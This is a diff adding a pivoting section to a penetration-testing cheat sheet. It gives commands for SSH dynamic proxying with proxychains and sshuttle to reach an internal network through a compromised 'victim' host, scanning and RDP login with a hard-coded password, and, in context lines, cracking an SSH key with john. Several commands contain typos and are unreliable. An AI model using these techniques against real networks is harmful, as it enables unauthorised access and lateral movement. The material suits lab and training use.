@@ -666,3 +666,41 @@ ssh2john id_rsa_1605800988509.id_rsa > id_rsa_hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
 ```
 </details>
+
+
+
+<div align="center"><h1> Persistence </h1></div>
+
+
+## Pivoting
+
+<details>
+<summary>SSH-Proxychain</summary></br>
+    
+```bash
+# Add your port to end of /etc/proxychains4.conf 
+socks4 127.0.0.1 9050
+
+# conncet SSH to Victim system
+# -D 9050  (Bind ssh to this port) , -f (send SSH to background) , -i pivot (private key file - you can remove this and just Enter password after command)
+ssh if -N -D 9050 -i pivot root@10.10.155.5
+
+# now use proxychains before each command on your system to send it to 9050 port from ssh to victim system
+# 10.10.10.255 is a system that you can access it from only victim system
+proxychains nmap 10.10.10.225
+proxychains xfreerdp /u:administrator /p:"12341234Mm." /v:10.10.10.225
+```
+</details>
+
+
+<details>
+<summary>sshuttle</summary></br>
+    
+```bash
+# Access to 10.10.10.0/24 network that just can accessable from 10.10.155.5 (victim) from you system ,  use second command if you dont have private key for ssh and want to use password
+# after that all commands on your system will be routed to 10.10.10.0/24 network
+sshutle -r root@10.10.155.5 10.10.10.0/24 -ssh-cmd "ssh -i pivot"
+sshuttle -r root@10.10.155.5 10.10.10.0/24
+```
+</details>
+
